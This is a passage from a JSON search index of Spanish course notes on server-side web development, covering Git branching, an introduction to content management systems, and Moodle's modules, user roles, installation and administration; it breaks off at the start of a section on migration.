    "content": "Imagina esta situación: tienes un proyecto ya en marcha, con una versión más o menos estable funcionando, y entonces surge la necesidad de desarrollar una nueva funcionalidad. Y esta nueva funcionalidad va a poner patas arriba una parte importante del código y va a dejar la aplicación hecha unos zorros durante un tiempo. Si trabajas con tu repositorio como hemos hecho hasta ahora, el resultado es que, durante ese tiempo, todo tu proyecto dejará de funcionar. No podrás hacer demos a los clientes (ni a tus profesores/as), no podrás probar la aplicación, no podrás cargarla con datos reales, etc. ¡Todo quedará paralizado hasta que la nueva funcionalidad esté en marcha! . En un equipo de desarrollo grande, esta es una situación cotidiana que provocaría que gran parte de la gente se tuviera que quedar de brazos cruzados a la espera de la finalización de la nueva funcionalidad. Pero incluso en un equipo pequeño es un engorro llegar a este extremo. Para evitarlo, existen las ramas (branches) de Git. Una rama no es más que una copia del repositorio que puede evolucionar por su cuenta mientras la rama original permanece inalterada. Los desarrolladores/as que trabajen en esa rama pueden así trabajar en la nueva funcionalidad sin que el resto del equipo se vea afectado. Cuando la nueva funcionalidad se termine, lo único que hay que hacer es fusionar las dos ramas. Esto puede ser un trabajo ímprobo si se han estado modificando los mismos archivos en la rama principal y en la rama nueva, pero no se trata de un fallo de Git, que quede claro, sino de un fallo de organización del equipo. Y si la nueva funcionalidad nunca llega a terminarse (cosa que puede ocurrir por miles de razones), no pasa nada: la rama se elimina, o simplemente se abandona, y la rama principal sigue intacta. Crear una rama nueva es tan sencillo como usar este comando: . $ git branch nombre-nueva-rama . El comando git branch tiene muchas otras posibilidades. Aquí te pongo unas cuantas: . $ git branch --list (saca un listado de todas las ramas existentes) $ git branch -d nombre-rama (elimina una rama) $ git branch -D nombre-rama (elimina una rama a lo bestia, incluso si tiene cambios sin fusionar) $ git branch -m nuevo-nombre (cambia en nombre de la rama actual) . Ten en cuenta que, cuando creas una rama, aún no estás trabajando en ella. Si quieres cambiar a esa rama para empezar a trastear con ella sin tocar a la principal, debes hacer un git checkout: . $ git checkout nombre-rama . Por último, para fusionar una rama con otra (típicamente, con la rama principal o main), tienes que seguir estos pasos: . | Asegúrate de estar situado en la rama que va a recibir la fusión. Si esa rama es main, tienes que hacer: $ git checkout main . | Haz un git pull para tener disponible la última versión del código. | Realiza la fusión de las dos ramas con git merge: $ git merge nombre-rama . | . En este punto, tendrás que resolver manualmente los conflictos que puedan surgir (si los hay), como hemos explicado más arriba. ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a143-proyectos-que-se-complican-c%C3%B3mo-crear-ramas",
    "relUrl": "/scv-git/#a143-proyectos-que-se-complican-cómo-crear-ramas"
  },"128": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "A1.4.4. ¿Aún quieres saber más?",
    "content": "Git es un sistema de control de versiones increíblemente completo. Sus creadores parecen haber pensado en escenarios de lo más aberrante y han tenido en cuenta casi cada cosa que puede suceder en un proyecto complejo. Si no, no se explica la enorme cantidad de comandos y posibilidades que ofrece. Si necesitas saber más cosas sobre Git, internet está plagada de contenidos de calidad (y otros bastante penosos) sobre este sistema. Como siempre te recomiendo, acude en primer lugar a la referencia oficial: https://git-scm.com/docs . Personalmente, a mí me gustan mucho los tutoriales de Atlassian. Aunque están orientados a BitBucket (un servicio competidor de GitHub o GitLab), casi todas sus recomendaciones son aplicables a cualquier servidor Git. Los puedes encontrar aquí: https://www.atlassian.com/es/git/tutorials . ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/#a144-a%C3%BAn-quieres-saber-m%C3%A1s",
    "relUrl": "/scv-git/#a144-aún-quieres-saber-más"
  },"129": {
    "doc": "Apéndice I. Sistemas de control de versiones. Git",
    "title": "Apéndice I. Sistemas de control de versiones. Git",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/scv-git/",
    "relUrl": "/scv-git/"
  },"130": {
    "doc": "About",
    "title": "About",
    "content": "Estos apuntes han sido elaborados por Alfredo Moreno Vozmediano y se publican aquí con licencia CC BY 4.0, lo que quiere decir que eres libre de usar este material, copiarlo, distribuirlo y modificarlo siempre que el resultado de todo eso mantenga la misma licencia y cites la autoría original. Algunos fragmentos (pocos) están tomados y adaptados de otras fuentes. Cuando eso ocurre, lo indico claramente en el texto. Debes atenerte a la licencia de los sitios web de origen para esos fragmentos. ",
    "url": "https://iescelia.org/docs/dwes/_site/about/",
    "relUrl": "/about/"
  },"131": {
    "doc": "1.1 Algunas cosas que debes saber sobre los CMS",
    "title": "1.1. Algunas cosas que debes saber sobre los CMS",
    "content": ". | 1.1.1. Inconvenientes de desarrollar una web desde cero | 1.1.2. Cómo funciona un CMS | 1.1.3. Tipos de CMS | 1.1.4. Algunos ejemplos de CMS importantes | 1.1.5. Instalación de un CMS | 1.1.6. Explotación de un CMS | . 1.1.1. Inconvenientes de desarrollar una web desde cero . Desarrollar sitios web programándolos desde cero (o más o menos desde cero, porque la mayor parte de las veces se parte de librerías existentes) tiene varias ventajas como: . | Nos permite sacar el máximo partido tanto del servidor como de los clientes. | Nos da un control absoluto sobre el sitio web que estamos desarrollando. | Nos posibilita ajustarnos al máximo a los requerimientos y crear aplicaciones a medida. | . Pero también tiene inconvenientes: . | La creación de un sitio desde cero es un proceso muy largo. | Las ampliaciones y actualizaciones del sitio también resultan lentas y costosas. | Ambas tareas (creación y actualización) requieren personal altamente cualificado, con conocimientos de todas las tecnologías implicadas. Es decir, desarrolladores web. Y eso cuesta dinero. | . Cuando los inconvenientes superan a las ventajas, el equipo de desarrollo puede optará por no desarrollar desde cero. Esto ocurre en la inmensa mayoría de los proyectos. No es necesario inventar la rueda cada vez que tengamos que construir un coche, ¿verdad? Pues para construir una aplicación web pasa lo mismo. Ahora bien, ¿de qué base partimos? Podemos construir una biblioteca de clases que resuelvan las tareas más habituales de cualquier aplicación web, cosas como la autenticación de usuarios, la seguridad, el acceso a bases de datos, etc. Cosas que se repiten una y otra vez con muy pocas variaciones. Esa biblioteca de clases puede ser más grande o más pequeña, más elaborada o más simple, más configurable o más rígida. Pero, sea como sea, nos ahorrará tiempo y esfuerzo en el desarrollo de nuevos proyectos. A esas bibliotecas se las denomina frameworks y es rara la aplicación web que no se programa usando alguna de las muchas que hay por ahí pululando, bien se usa un framework propio creado por el propio equipo de desarrollo. Pero se puede ir un paso más allá y utilizar una biblioteca más grande, una que ya te lo dé casi todo hecho y a la que solo tengas que indicarle qué tipografía, qué colores y qué contenidos quieres mostrar en tu web, y ella solita se las apañe para generarte la web de forma casi automática. Esta solución casi mágica son los sistemas gestores de contenido (CMS) de los que estamos hablando. Sin programar una sola línea de código, puedes tener lista en unos minutos una web plenamente funcional y de aspecto profesional. Por suerte para nosotros, los desarrolladores/as web, la CMS no pueden hacerlo todo. Son soluciones extraordinariamente eficaces para montar sitios web convencionales, pero cuando quieres crear algo que se salga de los límites muy marcados del CMS, necesitas a un programador/a. Y entonces, ¿a quién vas a llamar? . 1.1.2. Cómo funciona un CMS . Un CMS (Content Management System) es una aplicación web que se ejecuta en un servidor y se controla desde un navegador (cliente), y que nos permite: . | Crear a través del navegador un sitio web completamente nuevo en muy poco tiempo. | Administrar fácilmente todo lo relacionado con el sitio web: usuarios, privilegios, contenido, apariencia, menús, etc. | Y todo ello sin tener conocimientos de HTML, CSS, PHP ni el resto de tecnologías (ojo: no es necesario, pero sí conveniente) | . El CMS guarda el contenido del sitio web en una base de datos. Cuando se solicita una página, un programa escrito en PHP (o en otro lenguaje de servidor) busca el contenido de esa página en la BD y la genera dinámicamente, entregándola al navegador web (cliente). Además, otro conjunto de programas permiten agregar nuevo contenido, modificar el contenido existente, crear usuarios, gestionar privilegios, etc. Todo ello altera los datos existentes en la BD, que a su vez alteran la forma en la que el usuario percibe la página cuando la visita. Al sitio web en sí se le denomina a veces front-end. El front-end, en este sentido, es lo que ve el visitante de la web. A las páginas de adminsitración del sitio se les llama a veces back-end o dashboard (panel de administración). El back-end sólo es accesible a algunos usuarios (administradores, editores, etc). El CMS siempre necesita, por ello, un control de acceso de usuarios o login. ¡Cuidado! Los términos front-end y back-end son confusos. En términos de programación, a menudo se denomina front-end a la parte de la aplicación que se ejecuta en el navegador web y back-end a la parte de la aplicación que se ejecuta en el servidor e interactúa con los recursos del mismo (como la base de datos). En este otro sentido, el front-end está escrito en HTML, CSS, JavaScript (y cualquiera de las múltiples librerías que existen para Javascript, como jQuery, React o Vue.js) y el back-end está escrito en PHP, Java, Python u otros lenguajes del lado del servidor. Si encuentras por ahí una oferta de trabajo para un “desarrollador/a back-end” o “desarrollador/a front-end”, se refiere a esta última acepción de ambos términos. Es decir, están pidiendo un “desarrollador/a HTML + CSS + Javascript (y librerías de Javascrit)” o un “desarrollador/a en PHP o similar”. 1.1.3. Tipos de CMS . Hay un montón (¡pero un montón!) de CMS, y cada uno tiene sus propias características, puntos fuertes y puntos débiles. Como hay tantos, resulta útil clasificarlos. Algunos autores los clasifican según su método de distribución: . | Código abierto y software libre. | Código propietario. | . Pero, personalmente, creo que tiene más sentido clasificarlos por su funcionalidad. Así, nos encontramos con CMS de estos tipos (entre otros): . | CMS genéricos (para cualquier tipo de sitio web) | CMS para blogs. | CMS para foros. | CMS para wikis. | CMS para e-learning (aprendizaje en línea) | CMS para e-commerce (comercio electrónico) | CMS para publicaciones digitales (periódicos, revistas…) | . Algo tremendamente odioso de los CMS es que son fuertemente incompatibles entre sí. Cada uno utiliza un interfaz distinto, bases de datos completamente diferentes para almacenar la información, módulos incompatibles, etc. Existen algunas iniciativas para lograr que los servicios desarrollados en un CMS puedan utilizarse en otros, pero todavía están en un estadio muy inicial. Lo que sí existen son familias de CMS relacionados entre sí que pueden compartir algunas características, generalmente porque unos CMS han derivado de otros. 1.1.4. Algunos ejemplos de CMS importantes . Los CMS propietarios no han podido competir con los CMS libres. Por ello, han evolucionado hacia soluciones cloud computing completas, como Microsoft Azure, Google Cloud o Amazon Web Services (AWS). Entre los verdaderos CMS abundan las soluciones opensource o software libre. Por ejemplo: . | Blogs: WordPress, Jekyll, GetSimple, Umbraco… | Wikis: MediaWiki, XWiki, DokuWiki… | Foros: phpBB, MyBB, bbPress, Discourse… | e-learning: Moodle, WebCT, Mahara, etc. | e-commerce: PrestaShop, Magento, OsCommerce, OpenCart… | . Muchos de estos CMS desaparecerán, se fundirán con otros o se dividirán en varios proyectos desde que yo escriba estas líneas hasta que tú las leas. Lo mejor es que eches un vistazo a alguna lista actualizada de CMS, como esta de Wikipedia. 1.1.5. Instalación de un CMS . IMPORTANTE: la instalación puede diferir de un CMS a otro, pero, más o menos, todos necesitan los mismos pasos. Hay que leer cuidadosamente las instrucciones de instalación, que encontrarás en la web del desarrollador. Los pasos que suelen ser habituales en casi todos los CMS son: . | Descargar la última versión del programa de la web del desarrollador. | Asegurarse de que el servidor cumple los prerrequisitos para ejectuar el CMS (versión de Apache, PHP, MySQL u otro software necesario) | Subir el CMS por al servidor (por ftp, vía web o como tu proveedor de hosting te lo permita). | Crear la base de datos. | Lanzar la instalación del CMS. Esto suele hacerse cargando una dirección concreta en tu navegador. | Adapar el archivo de configuración (suele llamarse config.php, config.inc, o algo similar). En los CMS más elaborados este paso no es necesario, pues el programa de instalación se encarga de generar un archivo de configuración válido. | A veces, hay que modificar los permisos de algún directorio y/o archivo. | Instalar el paquete de idioma español (si está disponible) | . 1.1.6. Explotación de un CMS . IMPORTANTE: la explotación puede diferir notablemente de un CMS a otro, pero, en general, todo tienen una serie de elementos en común. Hay que leer cuidadosamente las instrucciones de uso, que encontrarás en la web del desarrollador. Pasos que suelen ser habituales en casi todos los CMS, una vez realizada la instalación: . | Asignar una password de alta seguridad al usuario administrador que se crea por defecto. | Crear otros usuarios y asignarles privilegios. | Editar la página de inicio del sitio web. | Cambiar la plantilla (apariencia) del sitio. | Instalar módulos de ampliación (si es necesario). | Crear el contenido y/o revisar el contenido creado por otros usuarios. | . En las siguientes secciones nos centraremos en la instalación y explotación de algunos de los CMS más populares del mercado. ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/algunas-cosas-que-debes-saber.html#11-algunas-cosas-que-debes-saber-sobre-los-cms",
    "relUrl": "/cms/algunas-cosas-que-debes-saber.html#11-algunas-cosas-que-debes-saber-sobre-los-cms"
  },"132": {
    "doc": "1.1 Algunas cosas que debes saber sobre los CMS",
    "title": "1.1 Algunas cosas que debes saber sobre los CMS",
    "content": " ",
    "url": "https://iescelia.org/docs/dwes/_site/cms/algunas-cosas-que-debes-saber.html",
    "relUrl": "/cms/algunas-cosas-que-debes-saber.html"
  },"133": {
    "doc": "Desarrollo Web en Entorno Servidor",
    "title": "Desarrollo Web en Entorno Servidor",
    "content": "Esta es la documentación (apuntes) del módulo de Desarrollo Web en Entorno Servidor del Ciclo Formativo de Grado Superior de Desarrollo de Aplicaciones Web impartido en el IES Celia Viñas de Almería (España). ",
    "url": "https://iescelia.org/docs/dwes/_site/",
    "relUrl": "/"
  },"134": {
    "doc": "1.3 Moodle",
    "title": "1.3. Moodle",
    "content": ". | 1.3.1. Características de Moodle | 1.3.2. Algunos módulos de Moodle | 1.3.3. Los roles de usuario en Moodle | 1.3.4. Instalación y explotación de Moodle | . (La información de esta sección está adaptada de docs.moodle.org, donde toda la documentación se encuentra publicada bajo una licencia GNU General Public License) . 1.3.1. Características de Moodle . Moodle es un sistema de gestión de contenidos orientado a crear comunidades de aprendizaje en línea. Este tipo de plataformas tecnológicas también se conoce como LMS (Learning Management System). Su licencia es GPL (es decir: es software libre). Moodle es un auténtico monstruo en cuanto a tamaño, funciones y posibilidades. Eso, por supuesto, tiene un coste: Moodle también es un devorador de recursos y resulta relativamente complejo de usar, tanto para el usuario final como para el administrador. Algunas soluciones propietarias, como Google Suite for Education, son más intuitivas y atractivas visualmente, pero están a años luz de Moodle en cuanto a funcionalidad. Moodle está programado en lenguaje PHP y puede usar diferentes gestores de bases de datos para almacenar el contenido. MySQL o PostgreSQL son los más habituales, pero también es posible utilizar Oracle o SQL Server. Las características más destacables de Moodle son: . | Su arquitectura y herramientas son apropiadas para la educación a distancia, y también para complementar el aprendizaje presencial. | Tiene una interfaz de usuario sencilla y compatible con todos los navegadores y las recomendaciones W3C. Eso sí, es más complejo que otras soluciones como Google Suite for Education, aunque Moodle también es muchísimo más potente. | La instalación es sencilla (¡casi siempre!), requiriendo tan solo un servidor que soporte bases de datos y PHP con algunas extensiones bastante comunes. | Da mucha importancia a la seguridad: todos los formularios son revisados, las cookies cifradas, el alta de usuarios revisada, etc. | Es fuertemente configurable, permitiendo la instalación de módulos adicionales (plugins) para incrementar sus posibilidades. | También pueden instalarse plantillas para cambiar su apariencia. | Es un sistema enorme que consume muchos recursos en el servidor. | . 1.3.2. Algunos módulos de Moodle . Los recursos en Moodle se organizan mediante cursos. Un curso es gestionado por uno o varios profesores/as, que puede editar el contenido, y contiene un puñado de alumnos/as (organizados en grupos o no) que pueden acceder a los recursos pero no editarlos. Ejemplo de lista de cursos disponibles en una instalación de Moodle (extraido de docs.moodle.org) . En Moodle, esos recursos se clasifican en categorías llamadas módulos. Cada módulo tiene sus propias características y está orientado a un tipo de actividad distinta: cuestionarios en línea, lecciones, tareas para que los alumnos suban, encuestas y otro montón más. Un usuario administrador puede instalar o desinstalar módulos para ajustar su versión de Moodle a las necesidades de su organización. Por eso, aunque todos los Moodle se parecen, cada uno tiene sus propias características. Los profesores/as pueden, dentro de sus cursos, utilizar todos los módulos que estén disponibles en el sistema para crear los recursos que su alumnado verá al acceder al curso en cuestión. Lista de recursos disponibles en Moodle (puede variar dependiendo de los plugins instalados) . A la hora de crear un recurso, Moodle proporciona al profesor/a una enorme (y cuando digo enorme quiero decir enooorme) cantidad de posibilidades de configuración. Cada tipo de recurso tiene diferentes configuraciones, claro, pero algunas de las más típicas son: . | Descripción detallada del recurso. | Fechas en las cuales ese recurso va a estar disponible para el alumnado. | Restricciones de acceso. | Calificación (numérica, cualitativa, por rúbrica, sin calificación…) | Retroalimentación al finalizar la actividad. | . Ejemplo de configuración de un recurso (una tarea, en este caso) . A continuación vamos a describir los módulos más populares. Módulo de archivos . Los archivos son uno de los recursos más simples de los que dispone Moodle. Se trata, simplemente, de documentos que sube el profesor/a y que estarán accesibles al alumnado. Los documentos pueden ser de cualquier tipo. Módulo de Tareas . Este módulo sirve para que el alumnado envíe tareas al profesor/a. Estas tareas pueden constar de un texto en línea o uno o varios archivos subidos a la plataforma. | Puede especificarse la fecha final de entrega de una tarea y la calificación máxima que se le podrá asignar. | Los estudiantes pueden subir sus tareas (en cualquier formato de archivo) al servidor. Se registra la fecha en que se han subido. | Se permite enviar tareas fuera de tiempo, pero el profesor puede ver claramente el tiempo de retraso. | Para cada tarea en particular, puede evaluarse a cada estudiante (calificaciones y comentarios) en una única página con un único formulario. Incluso se puede corregir el documento escribiendo encima, como haríamos con una tarea hecha en papel. | Las observaciones del profesor se adjuntan a la página de la tarea de cada estudiante y se le envía un mensaje de notificación. | El profesor/a tiene la posibilidad de permitir el reenvío de una tarea tras su calificación (para volver a calificarla). | . Ejemplo de tarea de subida de texto en línea. Así es como la ve un estudiante una vez creada. Módulo de consultas . Las consultas son votaciones. Pueden usarse para votar sobre algo o para recibir una respuesta de cada estudiante (por ejemplo, para pedir su consentimiento para algo). | El profesor/a puede ver una tabla que presenta de forma intuitiva la información sobre quién ha elegido qué. | Se puede permitir que los estudiantes vean un gráfico actualizado de los resultados. | . Módulo de foro . Hay diferentes tipos de foros disponibles: exclusivos para los profesores, de noticias del curso y abiertos a todos. | Las discusiones pueden verse anidadas u ordenadas cronológicamente. | El profesor/a puede obligar a la suscripción del alumnado a un foro o permitir que cada persona elija a qué foros suscribirse. | Se pueden habilitar o inahibilitar las respuestas en un foro o en un determinado tema. | El profesor/a puede mover los temas de discusión entre distintos foros. | La participación en el foro del alumnado se puede calificar. | . Módulo de Cuestionarios . Los cuestionarios son los típicos exámenes tipo test. Pueden utilizarse como exámenes, como ejercicios de autoevaluación, como pruebas de evaluación inicial, etc. | Los profesores/as pueden definir una base de datos de preguntas que podrán ser usadas en diferentes cuestionarios. Esto requiere una gran inversión de tiempo al principio, pero luego pueden reutilizarse las preguntas toda la vida. Y existen bancos de preguntas disponibles en internet. | Las preguntas pueden ser almacenadas en categorías de fácil acceso, y estas categorías pueden hacerse accesibles desde cualquier curso de Moodle. | Los cuestionarios se califican automáticamente. Pueden ser recalificados si se modifican las preguntas. | Los cuestionarios pueden tener un límite de tiempo a partir del cual no estarán disponibles. | El profesor/a puede determinar si los cuestionarios pueden ser resueltos varias veces y si se mostrarán o no las respuestas correctas y los comentarios | Las preguntas y las respuestas de los cuestionarios pueden ser mezcladas (aleatoriamente) para impedir que el alumnado recurra al viejo truco de copiarse unos a otros. | Las preguntas pueden incorporar imágenes y otros recursos multimedia. | Hay preguntas de muchísimos tipos: verdadero/falso, respuesta múltiple, texto abierto, emparejamiento, etc. Incluso hay respuestas calculadas, perfectas para plantear un problema matemático o científico cuyos datos de entrada sean variables. | . Módulo de encuestas . Las encuestas permiten al profesor/a conocer más datos sobre el progreso del alumnado o sobre la efectividad de un curso o un conjunto de recursos. Es importante aclarar que el módulo de cuestionarios y el módulo de encuestas se parecen pero no son iguales. El primero es un módulo adicional opcional de Moodle (si bien es muy popular). El segundo es un módulo estándar predefinido bastante menos potente. | Existen encuestas ya preparadas que sirven como instrumentos para el análisis de proceso de enseñanza en línea. | Se pueden generar informes de las encuestas, descargables como texto (CSV) o como hoja de cálculo para su posterior análisis. | A cada estudiante se le informa sobre sus resultados comparados con la media de la clase. | . Módulo de Wikis . Un wiki es un espacio colaborativo de construcción de contenido. En los wikis (como en Wikipedia) es la comunidad la que redacta y revisa el contenido. Las diferentes entradas del wiki pueden enlazarse entre sí (enlaces internos) o con otras páginas (enlaces externos). También se puede insertar contenido multimedia. | Cualquier usuario puede editar cualquier artículo (bueno, en Wikipedia hay ciertos artículos protegidos, pero en los wikis de Moodle, no). | El wiki permite que el alumnado trabaje sobre los mismos documentos de forma grupal. | Se guarda un historia completo de todas las modificaciones de cada entrada del wiki, de modo que pueda revertirse un cambio si se ha producido un error o una vandalización. | Se guarda un registro de qué usuarios han hecho cada cambio. | El profesor/a puede calificar la participación de cada alumno/a en el wiki. | . Módulo de lección . Las lecciones de Moodle son colecciones de páginas web enlazadas entre sí, de modo que cuentan una historia. Al final de cada página, el profesor/a puede introducir una pregunta para comprobar en qué grado el alumno/a ha asimilado el contenido. En función de la respuesta, la lección puede dirigir al alumno/a a una página o a otra diferente, de modo que cada persona puede seguir su propio camino a lo largo de la lección. Es como uno de esos libros de “Elige tu propia aventura”, pero con un solo final (la asimilación de la lección) al que cada persona puede llegar por un camino diferente, a veces corto y directo, a veces largo y tortuoso. Otros módulos . Moodle tiene muchos (pero muchos) otros módulos, algunos predefinidos y otros instalables mediante plugins. También se pueden desarrollar plugins nuevos para Moodle, desde luego, aunque en este curso no entraremos en ello. Mencionamos a continuación muy brevemente algunos otros módulos que es habitual encontrar: . | Enlace externo: para crear links a recursos fuera de Moodle. | Página: para crear páginas web dentro de Moodle con un sencillo editor WYSIWYG. | Chat: para programar sesiones de chat de texto entre los miembros de un curso. | Glosario: para crear listas de definiciones, de forma similar a un diccionario, o, en general, para organizar información. | Base de datos: para crear de forma colaborativa un repositorio de información sobre cualquier temática. La estructura de cada registro de información la define el profesor/a. | Taller: para crear tareas con revisión entre pares. Los criterios de revisión los establece el profesor/a. | Libro: para crear material de estudio o de consulta en formato libro, con capítulos y subcapítulos. | . 1.3.3. Los roles de usuario en Moodle . Como en todo sistema complejo, en Moodle existen varios roles de usuario predefinidos, cuyo papel dentro del sistema es ligeramente distinto. Estos roles son: . | Invitado. No necesitan autenticarse. Solo pueden acceder a la página principal y a algunos cursos marcados como “con acceso a invitados”. No pueden subir tareas, ni participar en los foros, ni contribuir al contenido de ninguna otra manera. | Estudiante. Son usuarios registrados que necesitan autenticarse. Tienen acceso a determinados cursos. Para acceder a ellos tienen que estar matriculados en los mismos, algo que puede hacer el profesor/a o pueden hacer por su cuenta conociendo una clave de matriculación. Una vez que acceden a un curso, tienen acceso a todos los recursos que el profesor/a haya hecho visibles y pueden subir tareas y participar en foros, chats, wikis, etc. El profesor/a puede calificar todas sus contribuciones. | Profesor/a sin permisos de edición. Puede acceder a sus cursos, evaluar las tareas del alumnado y interactuar con ellos en chats, foros y demás, pero no puede añadir, borrar ni modificar los recursos del curso. | Profesor/a con permisos de edición. Puede hacer todo lo del anterior y, además, añadir, borrar y modificar recursos en un curso. Un mismo usuario puede ser profesor/a en un curso (y, por tanto, administrarlo) y estudiante en otro, o no tener ni siquiera privilegios de acceso a los otros cursos. El profesor/a tiene acceso a un completísimo sistema de cálculo de calificaciones de sus estudiantes. | Administrador/a. Este usuario puede acceder con privilegios plenos a todos los cursos y también a la administración de Moodle, lo que incluye un montón de cosas: administración de usuarios, de cursos, de categorías, de plugins, de plantillas, de las copias de seguridad, de la configuración del servidor y un largo etcétera. | . Además, el administrador cuenta, entre sus privilegios, con la posibilidad de renombrar estos roles y también de definir roles nuevos, asignando los permisos que considere conveniente a cada rol. 1.3.4. Instalación y explotación de Moodle . Moodle es un CMS mucho más complejo que Wordpress. Por eso, su instalación y explotación, aunque no difieren mucho en esencia de la de Wordpress, puede plantearte más problemas. En esta sección vamos a ver a grandes rasgos en qué consisten las dos cosas. Instalación de Moodle . La instalación de Moodle es, como decimos, parecida a la de Wordpress: . | En primer lugar, debemos descargar el código fuente de Moodle del sitio oficial (moodle.org) y subirlo a nuestro servidor mediante FTP, SSH o el sistema de administración de archivos que nos facilite nuestro proveedor de hosting. El código fuente debe subirse a una carpeta accesible vía web (es decir, debe estar dentro de htdocs, httpdocs o public_html). | Creamos un directorio llamado moodledata vacío. Este directorio contendrá todos los recursos de los cursos. Lo ideal es que, por seguridad, el directorio moodledata NO sea accesible vía web (es decir, NO debe estar dentro de htdocs, httpdocs o public_html), pero, a veces, dependiendo de la configuración del servidor, esto no será posible. | Creamos una base de datos vacía. | Lanzamos la instalación. Para ello, solo tenemos que escribir la URI de la carpeta donde hemos copiado el código fuente. Algo como: https://mi-servidor/mi-carpeta-moodle | El programa de instalación se empezará a ejecutar y nos preguntará los datos típicos: nombre del sitio, nombre del host de bases de datos, usuario y contraseña para la base de datos, usuario y contraseña para el administrador de Moodle… Ah, y también te preguntará por la ubicación de la carpeta moodledata. | En cierto momento de la instalación, Moodle hará una comprobación de las extensiones de PHP instaladas en el servidor. Nos mostrará en color verde las extensiones detectadas, en amarillo o naranja las que no están instaladas pero no son imprescindibles, y en color rojo las que no están instaladas y que sí son imprescindibles. Es necesario instalar esas extensiones para poder usar Moodle. En ese caso, deberás contactar con tu proveedor de hosting para solicitarle la instalación de esas extensiones (o, en general, para solicitarle un entorno apto para la ejecución de Moodle). | Si todo va bien, Moodle comenzará a crear la estructura de la base de datos (lo cual puede demorarse unos minutos, porque la base de datos tiene más de doscientas tablas) y, al terminar, tendrás funcionando una instalación de Moodle limpia y lista para usar. | . Listado de comprobación de extensiones durante la instalación de Moodle . Labores de administración . Ya hemos dicho varias veces que Moodle es un sistema realmente grande y complejo, ¿verdad? . Así que seguro que no te sorprenderá oír que la administración de Moodle también es compleja. El mejor consejo que te puedo dar en este punto es: olvídate de tutoriales y manuales y, en su lugar, instálate un Moodle de prueba en tu servidor local y dedícate a trastear con él como si fuera un Moodle real. Crea usuarios y cursos, cambia la plantilla, juguetea con los enrolamientos, curiosea el administrador de archivos y las opciones de configuración del servidor… . Esta es la mejor manera de familiarizarse con la administración de Moodle. Luego, en el mundo real, cuando surja un problema real, sabrás (más o menos) a dónde dirigirte, o al menos no estarás por completo perdido/a. Y, por supuesto, cuando necesites consultar algo, acude siempre en primer lugar a la documentación oficial: https://docs.moodle.org . En esta sección solo vamos a referirnos a las labores críticas de administración, esas que hay que hacer sí o sí para poner en marcha en Moodle recién instalado. | Configurar el homepage. Una vez autenticado con un usuario administrador de Moodle, busca siempre el menú “Site administration” para acceder a las opciones de administración. Esas opciones están agrupadas por categorías: Usuarios, Cursos, Servidor, etc. Una de las primeras cosas que tendrás que hacer allí es buscar la sección “Front page” y, una vez allí, la opción “Front page settings”. Al acceder a esta opción, podrás establecer el nombre de tu sitio y las cosas que quieres que aparezcan en el home. Al terminar, no olvides pulsar el botón para guardar los cambios que estará al final de la página. | Cambiar la plantilla o theme. Las últimas versiones de Moodle vienen con dos plantillas preinstaladas, llamadas “Boost” y “Classic”. Cualquiera de las dos son totalmente funcionales, pero también un poco aburridas. Si quieres que tu Moodle luzca de un modo distinto, necesitarás buscar otra plantilla en internet (las hay gratuitas y de pago) y luego acceder a “Site administration” -&gt; “Site appearance” para instalarla y activarla. Por supuesto, existe toda una rama de negocio centrada en la creación de themes para Moodle (muchos basados en las plantillas “Boost” y “Classic”), así como en el desarrollo de plugins. Sin embargo, entrar en detalles sobre cómo se hace eso excede a los propósitos de este curso. | Crear categorías y cursos. Si tu Moodle va a contener muchos cursos (más de seis o siete), lo más apropiado es que los organices en categorías para no volver locos a los estudiantes. Sea como sea, los cursos y las categorías pueden crearse, modificarse y eliminarse en “Site administration” -&gt; “Courses”. Es buena idea que eches un vistazo a la opción “Course default settings” en primer lugar, porque todos los cursos que crees van a heredar esos settings por defecto. | Administrar usuarios. Por último, en la sección “Site administration” -&gt; “Users” puedes admnistrar todo lo relativo a la creación de usuarios registrados: . | Formas de autenticación de usuarios: podrás elegir entre permitir que los usuarios se auto-registren en tu plataforma usando su email, o bien impedir esta posibilidad y registrar manualmente a los usuarios (lo cual es más seguro pero también más trabajoso). | Formas de enrolamiento (matriculación) en los cursos: también tendrás que elegir si vas a permitir que los estudiantes se enrolen (o matriculen) en los cursos por sí mismos (en cuyo caso, los profesores/as tienen que establecer una clave de matriculación y comunicársela a sus estudiantes para evitar accesos no deseados) o si la matriculación de hará manualmente. | . | Configurar el sitio. Las opciones de configuración están repartidas por todo el menú de administración y puedes pasarte semanas curioseando por ellas sin acabar de recorrerlas todas. Pero hay unas cuantas a las que debes prestar atención en el momento de poner en marcha tu Moodle: . | Idioma: lo puedes configurar en “Site administration” -&gt; “Language” -&gt; “Language settings”. Puedes agregar paquetes de idiomas que no estén instalados en “Site administration” -&gt; “Language” -&gt; “Language pack”. | País y huso horario: muy importante para que las fechas de las entregas funcionen correctamente. Se ajusta en “Site administration” -&gt; “Location” -&gt; “Location settings”. | Seguridad de las contraseñas: puedes ajustarla en “Site administration” -&gt; “Security” -&gt; “Site security settings” -&gt; “Password policy”. | Plugins: en concreto, deberías revisar los módulos que quieres que estén disponibles para tus profesores/as, lo cual se hace en “Site administration” -&gt; “Plugins” -&gt; “Activity modules”. | . | . Ahora ya tienes un Moodle más o menos preparado para dejarlo en manos de tus profesores/as, de modo que empiecen a cargar contenido en sus cursos y a trabajar con el alumnado. Si nunca has ejercicio como profesor/a en Moodle, te aconsejo que tú mismo/a te des de alta en un curso como profesor/a y trastees un buen rato creando y modificando contenido. Es la mejor forma de aprender a hacerlo. Y, siempre, recuerda que Moodle es un CMS tan enorme que nunca se terminan de conocer todos sus recovecos. Migración . Lo que sigue es aplicable a la gran mayoría de los CMS, no solo a Moodle. Si lo incluimos aquí es porque, con Moodle, el proceso de migración resulta particularmente complicado. Migrar una aplicación web significa moverla de un servidor a otro sin que se pierda ni el contenido, ni la funcionalidad ni la apariencia. Es decir, la experiencia del usuario no debe verse afectada. No visitante no deberían ni enterarse de que ahora la web está corriendo en otro servidor (salvo que hayamos cambiado el nombre de dominio, claro). Para muchos CMS, existen plugins que automatizan o semiautomatizan el proceso de migración. Sin embargo, y según mi experiencia personal, aunque esos plugins pueden resultar útiles en Wordpress, con Moodle dejan mucho que desear y el proceso debe hacerse manualmente. La migración manual de una aplicación web consiste en: . | Descargar una copia completa de todos los archivos de tu Moodle en su estado actual. Eso 